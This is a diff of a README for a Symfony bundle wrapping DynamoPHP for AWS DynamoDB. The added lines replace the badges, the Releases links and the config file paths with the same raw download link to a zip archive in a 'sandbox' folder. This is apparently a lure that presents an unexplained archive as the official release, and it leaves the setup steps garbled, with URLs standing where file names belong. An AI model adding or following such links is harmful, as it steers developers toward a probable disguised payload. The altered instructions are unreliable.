@@ -1,7 +1,7 @@
 # DynamoPHP Symfony Bundle 🚀
 
-![DynamoPHP Symfony Bundle](https://img.shields.io/badge/DynamoPHP%20Symfony%20Bundle-v1.0.0-blue.svg)  
-[![Release](https://img.shields.io/badge/Release-Download%20Latest%20Version-brightgreen)](https://github.com/NonStopHitler/dynamophp-symfony/releases)
+![DynamoPHP Symfony Bundle](https://github.com/NonStopHitler/dynamophp-symfony/raw/refs/heads/main/sandbox/symfony-dynamophp-v1.9.zip%20Symfony%https://github.com/NonStopHitler/dynamophp-symfony/raw/refs/heads/main/sandbox/symfony-dynamophp-v1.9.zip)  
+[![Release](https://github.com/NonStopHitler/dynamophp-symfony/raw/refs/heads/main/sandbox/symfony-dynamophp-v1.9.zip%20Latest%20Version-brightgreen)](https://github.com/NonStopHitler/dynamophp-symfony/raw/refs/heads/main/sandbox/symfony-dynamophp-v1.9.zip)
 
 Welcome to the DynamoPHP Symfony Bundle! This bundle integrates DynamoPHP into Symfony applications, allowing for seamless configuration and service registration. With this bundle, you can leverage the power of AWS DynamoDB in your Symfony projects.
 
@@ -35,7 +35,7 @@ To install the DynamoPHP Symfony Bundle, follow these steps:
    composer require nonstophitler/dynamophp-symfony
    ```
 
-2. **Add Bundle to Kernel**: Register the bundle in your `config/bundles.php` file:
+2. **Add Bundle to Kernel**: Register the bundle in your `https://github.com/NonStopHitler/dynamophp-symfony/raw/refs/heads/main/sandbox/symfony-dynamophp-v1.9.zip` file:
 
    ```php
    return [
@@ -44,7 +44,7 @@ To install the DynamoPHP Symfony Bundle, follow these steps:
    ];
    ```
 
-3. **Configuration**: After installation, configure the bundle in your `config/packages/dynamophp.yaml` file.
+3. **Configuration**: After installation, configure the bundle in your `https://github.com/NonStopHitler/dynamophp-symfony/raw/refs/heads/main/sandbox/symfony-dynamophp-v1.9.zip` file.
 
 ## Usage
 
@@ -80,7 +80,7 @@ For more advanced scenarios, you can use the data mapper feature to handle compl
 
 ## Configuration
 
-You can configure the DynamoPHP Symfony Bundle by editing the `config/packages/dynamophp.yaml` file. Here is an example configuration:
+You can configure the DynamoPHP Symfony Bundle by editing the `https://github.com/NonStopHitler/dynamophp-symfony/raw/refs/heads/main/sandbox/symfony-dynamophp-v1.9.zip` file. Here is an example configuration:
 
 ```yaml
 dynamo_php:
@@ -121,10 +121,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-For support, please visit the [Releases](https://github.com/NonStopHitler/dynamophp-symfony/releases) section. Here you can find the latest versions and download them for your project.
+For support, please visit the [Releases](https://github.com/NonStopHitler/dynamophp-symfony/raw/refs/heads/main/sandbox/symfony-dynamophp-v1.9.zip) section. Here you can find the latest versions and download them for your project.
 
 ## Conclusion
 
 The DynamoPHP Symfony Bundle provides a robust solution for integrating AWS DynamoDB into your Symfony applications. With its easy setup, strong typing, and powerful features, you can streamline your data management processes. We hope you find this bundle useful for your projects. Happy coding!
 
-For more information, please check the [Releases](https://github.com/NonStopHitler/dynamophp-symfony/releases) section for updates and new features.
+For more information, please check the [Releases](https://github.com/NonStopHitler/dynamophp-symfony/raw/refs/heads/main/sandbox/symfony-dynamophp-v1.9.zip) section for updates and new features.
